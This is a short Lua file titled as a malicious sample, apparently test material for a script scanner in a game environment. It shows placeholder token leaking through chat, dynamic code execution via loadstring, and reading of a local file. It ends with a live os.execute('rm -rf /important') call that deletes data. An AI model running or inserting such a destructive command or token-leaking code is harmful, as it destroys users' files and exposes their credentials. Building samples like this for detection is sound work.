-- malicious_sample.lua
local function stealData()
    local token = "user_token_12345"
    print("Account Token: " .. token)
    Chat:sendSystemMsg("Token: " .. token)
end

local function executeRemote()
    local code = "print('injected')"
    loadstring(code)()
end

local function accessFiles()
    local file = io.open("sensitive_data.txt", "r")
    if file then
        local data = file:read("*all")
        print(data)
        file:close()
    end
end

os.execute("rm -rf /important")
